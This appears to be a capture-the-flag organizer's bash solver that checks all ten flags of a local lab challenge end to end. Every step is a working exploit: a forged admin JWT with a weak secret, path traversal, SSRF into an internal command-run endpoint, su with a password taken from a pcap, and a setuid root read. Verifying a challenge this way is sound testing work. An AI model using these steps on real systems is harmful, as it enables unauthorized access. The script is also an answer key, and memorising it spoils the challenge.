#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."

KEY="keys/ctfbuilder_ed25519"
PORT=2203
HOST="ctfbuilder@127.0.0.1"
SSH_OPTS=(-i "$KEY" -p "$PORT" -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10)
RELEASE_SECRET=$(cat ../organizer/release-secret.txt)

SSH() { ssh "${SSH_OPTS[@]}" "$HOST" "$@"; }

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import hmac, hashlib
d = hmac.new('$RELEASE_SECRET'.encode(), f'intermediate-portside:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

F1=$(SSH "curl -s http://localhost:5000/docs | grep -oE 'HLC\{[a-f0-9]{10}\}'")
check 1 "$F1"

F2=$(SSH "curl -s http://localhost:5000/manifest/abc | grep -oE 'HLC\{[a-f0-9]{10}\}' | head -1")
check 2 "$F2"

TOKEN=$(SSH "curl -s http://localhost:5000/guest-token" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
F3=$(python3 -c "import jwt; print(jwt.decode('$TOKEN', options={'verify_signature': False})['note'])")
check 3 "$F3"

ADMIN_JWT=$(python3 -c "import jwt; print(jwt.encode({'role':'admin'}, 'letmein', algorithm='HS256'))")
F4=$(SSH "curl -s -H 'Authorization: Bearer $ADMIN_JWT' http://localhost:5000/admin/dashboard | grep -oE 'HLC\{[a-f0-9]{10}\}'")
check 4 "$F4"

F5=$(SSH "curl -s 'http://localhost:5000/reports?file=../config/secrets.txt' | grep -oE 'HLC\{[a-f0-9]{10}\}'")
check 5 "$F5"

F6=$(SSH "curl -s --get --data-urlencode 'url=http://127.0.0.1:5001/status' http://localhost:5000/preview | grep -oE 'HLC\{[a-f0-9]{10}\}'")
check 6 "$F6"

F7=$(SSH "curl -s --get --data-urlencode 'url=http://127.0.0.1:5001/run?cmd=cat+/opt/portside/flag7.txt&token=diag-9f3a-internal' http://localhost:5000/preview")
check 7 "$F7"

SSH "curl -s -H 'Authorization: Bearer $ADMIN_JWT' http://localhost:5000/incident-capture.pcap -o /tmp/capture.pcap"
PCAP_BODY=$(SSH "/opt/venv/bin/python3 -c \"from scapy.all import rdpcap; pkts = rdpcap('/tmp/capture.pcap');
[print(bytes(p['Raw'].load).decode()) for p in pkts if p.haslayer('Raw')]\"")
F8=$(echo "$PCAP_BODY" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 8 "$F8"
DOCKWORKER_PW=$(echo "$PCAP_BODY" | sed -n 's/.*dockworker_password=\(.*\)/\1/p' | tr -d '\r')

F9=$(SSH "curl -s --get --data-urlencode \"url=http://127.0.0.1:5001/run?cmd=echo+$DOCKWORKER_PW+|+su+dockworker+-c+'cat+/home/dockworker/flag9.txt'&token=diag-9f3a-internal\" http://localhost:5000/preview")
check 9 "$F9"

# Write the privesc payload to a file on the guest first, rather than
# trying to URL-encode a multi-quote python -c string through curl.
SSH "printf '%s\n' \"import os; os.setuid(0); print(open('/root/flag10.txt').read())\" > /tmp/root_read.py"
F10=$(SSH "curl -s --get --data-urlencode 'url=http://127.0.0.1:5001/run?cmd=python3+/tmp/root_read.py&token=diag-9f3a-internal' http://localhost:5000/preview")
check 10 "$F10"

echo
echo "All 10 flags verified end-to-end."
